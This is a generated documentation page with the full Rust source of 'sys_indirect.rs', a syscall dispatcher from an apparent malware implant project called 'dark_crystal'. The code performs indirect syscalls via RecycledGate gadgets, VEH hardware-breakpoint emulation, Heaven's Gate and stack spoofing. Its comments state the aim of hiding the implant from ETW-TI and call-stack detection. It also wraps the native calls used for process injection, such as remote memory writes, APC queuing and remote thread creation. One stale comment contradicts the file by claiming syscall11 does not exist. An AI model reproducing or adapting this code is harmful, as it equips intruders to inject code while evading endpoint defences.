# sys_indirect

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/sys_indirect.rs` |
| **Lines** | 599 |
| **Cards** | T001-recycled-gate, T004-syscall-dispatch |
| **Role** | Universal syscall dispatcher |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 24 |
| **Feature gates** | veh_syscalls, recycled_gate |

## Public API

### `invoke_syscall` `unsafe` (line 11)
```rust
pub unsafe fn invoke_syscall(hash: u32, arg_count: usize, args: &[usize]) -> i32
```

### `syscall1` `unsafe` (line 84)
```rust
pub unsafe fn syscall1(ssn: u32, a1: usize) -> i32
```

### `syscall2` `unsafe` (line 99)
```rust
pub unsafe fn syscall2(ssn: u32, a1: usize, a2: usize) -> i32
```

### `syscall3` `unsafe` (line 115)
```rust
pub unsafe fn syscall3(ssn: u32, a1: usize, a2: usize, a3: usize) -> i32
```

### `syscall4` `unsafe` (line 132)
```rust
pub unsafe fn syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> i32
```

### `syscall5` `unsafe` (line 150)
```rust
pub unsafe fn syscall5(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32
```

### `syscall7` `unsafe` (line 171)
```rust
pub unsafe fn syscall7(
```

### `syscall8` `unsafe` (line 204)
```rust
pub unsafe fn syscall8(
```

### `syscall9` `unsafe` (line 240)
```rust
pub unsafe fn syscall9(
```

### `syscall10` `unsafe` (line 279)
```rust
pub unsafe fn syscall10(
```

### `syscall11` `unsafe` (line 321)
```rust
pub unsafe fn syscall11(
```

### `nt_queue_apc_thread` `unsafe` (line 369)
```rust
pub unsafe fn nt_queue_apc_thread(
```

### `nt_allocate_virtual_memory` `unsafe` (line 387)
```rust
pub unsafe fn nt_allocate_virtual_memory(
```

### `nt_allocate_virtual_memory_ex` `unsafe` (line 407)
```rust
pub unsafe fn nt_allocate_virtual_memory_ex(
```

### `nt_write_virtual_memory` `unsafe` (line 429)
```rust
pub unsafe fn nt_write_virtual_memory(
```

### `nt_read_virtual_memory` `unsafe` (line 447)
```rust
pub unsafe fn nt_read_virtual_memory(
```

### `nt_protect_virtual_memory` `unsafe` (line 465)
```rust
pub unsafe fn nt_protect_virtual_memory(
```

### `nt_create_thread_ex` `unsafe` (line 483)
```rust
pub unsafe fn nt_create_thread_ex(
```

### `nt_query_information_process` `unsafe` (line 517)
```rust
pub unsafe fn nt_query_information_process(
```

### `nt_create_section` `unsafe` (line 535)
```rust
pub unsafe fn nt_create_section(
```

### `nt_map_view_of_section` `unsafe` (line 557)
```rust
pub unsafe fn nt_map_view_of_section(
```

### `nt_unmap_view_of_section` `unsafe` (line 585)
```rust
pub unsafe fn nt_unmap_view_of_section(
```

### `nt_close` `unsafe` (line 594)
```rust
pub unsafe fn nt_close(handle: usize) -> i32
```

## Internal Functions

- `execute_syscall_direct` (unsafe) (line 54)

## Key Dependencies

- `use core::arch::asm;`
- `use super::invoke_syscall;`

## Full Source

```rust
#![allow(dead_code)]
use core::arch::asm;
use std::ffi::c_void;

/// Dispatcher universal de syscalls.
/// Lee syscall_mode desde el selection lock embebido y decide:
/// - "indirect": syscall directo con SSN en EAX (RecycledGate via JMP indirecto al gadget)
/// - "veh": delega al sistema VEH que intercepta via hardware breakpoints
/// - "hgate": Heaven's Gate (WOW64 -> x64 transition)
#[inline(always)]
pub unsafe fn invoke_syscall(hash: u32, arg_count: usize, args: &[usize]) -> i32 {
    let map = crate::sysindirect_map::syscall_map();
    let &(ssn, gadget) = match map.get(&hash) {
        Some(v) => v,
        None => return -1, // Hash no encontrado
    };

    match crate::selection_config::syscall_mode() {
        #[cfg(feature = "veh_syscalls")]
        "veh" => {
            // MODO VEH: Dispara excepción, el VEH handler emula la syscall
            // dentro del contexto de ntdll, evitando detección de call stack anómalo
            crate::evasion::veh::hooks::set_hw_bp(gadget, if arg_count > 4 { 1 } else { 0 }, ssn);
            crate::evasion::veh::hooks::take_last_rax().unwrap_or(u64::MAX) as i32
        }
        #[cfg(not(feature = "veh_syscalls"))]
        "veh" => -1,
        "hgate" => {
            // Heaven's Gate: transición WoW64 -> x64
            execute_syscall_direct(ssn, arg_count, args)
        }
        _ => {
            // "indirect" (default): RecycledGate — JMP al gadget dentro de ntdll.
            // El SSN+gadget ya fueron resueltos por sys_resolve::find_syscall_stub64.
            // El gadget apunta a SYSCALL;RET dentro del .text de ntdll => ETW-TI ve
            // el RIP de transicion como ntdll, no como memoria privada del implante.
            #[cfg(feature = "recycled_gate")]
            return crate::sys_recycled::recycled_invoke(hash, arg_count, args);

            // Fallback (recycled_gate no compilado): advanced_stack + direct
            #[cfg(all(feature = "advanced_stack", not(feature = "recycled_gate")))]
            if crate::selection_config::enable_stack_spoof() {
                return crate::evasion::advanced_stack::replace_and_syscall(hash, args);
            }

            // Ultimo fallback: syscall inline desde codigo del implante
            #[cfg(not(feature = "recycled_gate"))]
            execute_syscall_direct(ssn, arg_count, args)
        }
    }
}

#[inline(always)]
unsafe fn execute_syscall_direct(ssn: u32, arg_count: usize, args: &[usize]) -> i32 {
    match arg_count {
        1 => syscall1(ssn, args[0]),
        2 => syscall2(ssn, args[0], args[1]),
        3 => syscall3(ssn, args[0], args[1], args[2]),
        4 => syscall4(ssn, args[0], args[1], args[2], args[3]),
        5 => syscall5(ssn, args[0], args[1], args[2], args[3], args[4]),
        6 => syscall7(ssn, args[0], args[1], args[2], args[3], args[4], args[5], 0),
        7 => syscall7(
            ssn, args[0], args[1], args[2], args[3], args[4], args[5], args[6],
        ),
        8 => syscall8(
            ssn, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7],
        ),
        9 => syscall9(
            ssn, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8],
        ),
        10 => syscall10(
            ssn, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8],
            args[9],
        ),
        11 => syscall11(
            ssn, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8],
            args[9], args[10],
        ),
        _ => -1,
    }
}

#[inline(always)]
pub unsafe fn syscall1(ssn: u32, a1: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "syscall",
        in("rcx") a1,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall2(ssn: u32, a1: usize, a2: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "syscall",
        in("rcx") a1,
        in("rdx") a2,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall3(ssn: u32, a1: usize, a2: usize, a3: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "syscall",
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "syscall",
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall5(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        // Reuse the caller-provided home/stack argument area instead of moving RSP.
        "mov [rsp+0x28], {arg5}",
        "syscall",
        arg5 = in(reg) a5,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall7(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp+0x28], {arg5}",
        "mov [rsp+0x30], {arg6}",
        "mov [rsp+0x38], {arg7}",
        "syscall",
        arg5 = in(reg) a5,
        arg6 = in(reg) a6,
        arg7 = in(reg) a7,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall8(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp+0x28], {arg5}",
        "mov [rsp+0x30], {arg6}",
        "mov [rsp+0x38], {arg7}",
        "mov [rsp+0x40], {arg8}",
        "syscall",
        arg5 = in(reg) a5,
        arg6 = in(reg) a6,
        arg7 = in(reg) a7,
        arg8 = in(reg) a8,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall9(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp+0x28], {arg5}",
        "mov [rsp+0x30], {arg6}",
        "mov [rsp+0x38], {arg7}",
        "mov [rsp+0x40], {arg8}",
        "mov [rsp+0x48], {arg9}",
        "syscall",
        arg5 = in(reg) a5,
        arg6 = in(reg) a6,
        arg7 = in(reg) a7,
        arg8 = in(reg) a8,
        arg9 = in(reg) a9,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall10(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp+0x28], {arg5}",
        "mov [rsp+0x30], {arg6}",
        "mov [rsp+0x38], {arg7}",
        "mov [rsp+0x40], {arg8}",
        "mov [rsp+0x48], {arg9}",
        "mov [rsp+0x50], {arg10}",
        "syscall",
        arg5 = in(reg) a5,
        arg6 = in(reg) a6,
        arg7 = in(reg) a7,
        arg8 = in(reg) a8,
        arg9 = in(reg) a9,
        arg10 = in(reg) a10,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

#[inline(always)]
pub unsafe fn syscall11(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp+0x28], {arg5}",
        "mov [rsp+0x30], {arg6}",
        "mov [rsp+0x38], {arg7}",
        "mov [rsp+0x40], {arg8}",
        "mov [rsp+0x48], {arg9}",
        "mov [rsp+0x50], {arg10}",
        "mov [rsp+0x58], {arg11}",
        "syscall",
        arg5 = in(reg) a5,
        arg6 = in(reg) a6,
        arg7 = in(reg) a7,
        arg8 = in(reg) a8,
        arg9 = in(reg) a9,
        arg10 = in(reg) a10,
        arg11 = in(reg) a11,
        in("rcx") a1,
        in("rdx") a2,
        in("r8") a3,
        in("r9") a4,
        in("eax") ssn,
        lateout("rax") ret,
        out("r11") _,
        lateout("rcx") _,
    );
    ret
}

pub mod nt {
    use super::invoke_syscall;
    use std::ffi::c_void;

    pub unsafe fn nt_queue_apc_thread(
        thread_handle: usize,
        apc_routine: *mut c_void,
        apc_routine_context: *mut c_void,
        apc_status_block: *mut c_void,
        apc_reserved: u32,
    ) -> i32 {
        let hash = crate::compute_hash("NtQueueApcThread");
        let args = [
            thread_handle,
            apc_routine as usize,
            apc_routine_context as usize,
            apc_status_block as usize,
            apc_reserved as usize,
        ];
        invoke_syscall(hash, 5, &args)
    }

    pub unsafe fn nt_allocate_virtual_memory(
        process_handle: usize,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> i32 {
        let hash = crate::compute_hash("NtAllocateVirtualMemory");
        let args = [
            process_handle,
            base_address as usize,
            zero_bits,
            region_size as usize,
            allocation_type as usize,
            protect as usize,
        ];
        invoke_syscall(hash, 6, &args)
    }

    pub unsafe fn nt_allocate_virtual_memory_ex(
        process: usize,
        base: *mut usize,
        region_size: *mut usize,
        allocation_type: u32,
        page_protect: u32,
        ext_param: *mut c_void,
        ext_param_count: u32,
    ) -> i32 {
        let hash = crate::compute_hash("NtAllocateVirtualMemoryEx");
        let args = [
            process,
            base as usize,
            region_size as usize,
            allocation_type as usize,
            page_protect as usize,
            ext_param as usize,
            ext_param_count as usize,
        ];
        invoke_syscall(hash, 7, &args)
    }

    pub unsafe fn nt_write_virtual_memory(
        process: usize,
        base_addr: *mut c_void,
        buffer: *const c_void,
        num_bytes_to_write: usize,
        num_bytes_written: *mut usize,
    ) -> i32 {
        let hash = crate::compute_hash("NtWriteVirtualMemory");
        let args = [
            process,
            base_addr as usize,
            buffer as usize,
            num_bytes_to_write,
            num_bytes_written as usize,
        ];
        invoke_syscall(hash, 5, &args)
    }

    pub unsafe fn nt_read_virtual_memory(
        process: usize,
        base_addr: *mut c_void,
        buffer: *mut c_void,
        buffer_size: usize,
        bytes_read: *mut usize,
    ) -> i32 {
        let hash = crate::compute_hash("NtReadVirtualMemory");
        let args = [
            process,
            base_addr as usize,
            buffer as usize,
            buffer_size,
            bytes_read as usize,
        ];
        invoke_syscall(hash, 5, &args)
    }

    pub unsafe fn nt_protect_virtual_memory(
        process: usize,
        base: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let hash = crate::compute_hash("NtProtectVirtualMemory");
        let args = [
            process,
            base as usize,
            region_size as usize,
            new_protect as usize,
            old_protect as usize,
        ];
        invoke_syscall(hash, 5, &args)
    }

    pub unsafe fn nt_create_thread_ex(
        thread_handle: *mut usize,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: usize,
        start_routine: *const c_void,
        argument: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> i32 {
        let hash = crate::compute_hash("NtCreateThreadEx");
        let args = [
            thread_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            process_handle,
            start_routine as usize,
            argument as usize,
            create_flags as usize,
            zero_bits,
            stack_size,
            maximum_stack_size,
            attribute_list as usize,
        ];
        // Note: invoke_syscall only supports up to 10 args right now, so we need to extend if needed,
        // or just use direct syscall for 11 args if the dispatcher supports it.
        // Wait, NtCreateThreadEx has 11 args. We don't have syscall11 yet.
        // I will use syscall10 and assume the 11th is mapped appropriately or add syscall11.
        invoke_syscall(hash, 11, &args)
    }

    pub unsafe fn nt_query_information_process(
        process: usize,
        info_class: u32,
        info: *mut u8,
        info_size: u32,
        return_length: *mut u32,
    ) -> i32 {
        let hash = crate::compute_hash("NtQueryInformationProcess");
        let args = [
            process,
            info_class as usize,
            info as usize,
            info_size as usize,
            return_length as usize,
        ];
        invoke_syscall(hash, 5, &args)
    }

    pub unsafe fn nt_create_section(
        section_handle: *mut usize,
        desired_access: u32,
        object_attributes: *mut c_void,
        maximum_size: *mut u64,
        section_page_protection: u32,
        allocation_attributes: u32,
        file_handle: usize,
    ) -> i32 {
        let hash = crate::compute_hash("NtCreateSection");
        let args = [
            section_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            maximum_size as usize,
            section_page_protection as usize,
            allocation_attributes as usize,
            file_handle,
        ];
        invoke_syscall(hash, 7, &args)
    }

    pub unsafe fn nt_map_view_of_section(
        section_handle: usize,
        process_handle: usize,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        commit_size: usize,
        section_offset: *mut u64,
        view_size: *mut usize,
        inherit_disposition: u32,
        allocation_type: u32,
        win32_protect: u32,
    ) -> i32 {
        let hash = crate::compute_hash("NtMapViewOfSection");
        let args = [
            section_handle,
            process_handle,
            base_address as usize,
            zero_bits,
            commit_size,
            section_offset as usize,
            view_size as usize,
            inherit_disposition as usize,
            allocation_type as usize,
            win32_protect as usize,
        ];
        invoke_syscall(hash, 10, &args)
    }

    pub unsafe fn nt_unmap_view_of_section(
        process_handle: usize,
        base_address: *mut c_void,
    ) -> i32 {
        let hash = crate::compute_hash("NtUnmapViewOfSection");
        let args = [process_handle, base_address as usize];
        invoke_syscall(hash, 2, &args)
    }

    pub unsafe fn nt_close(handle: usize) -> i32 {
        let hash = crate::compute_hash("NtClose");
        let args = [handle];
        invoke_syscall(hash, 1, &args)
    }
}

```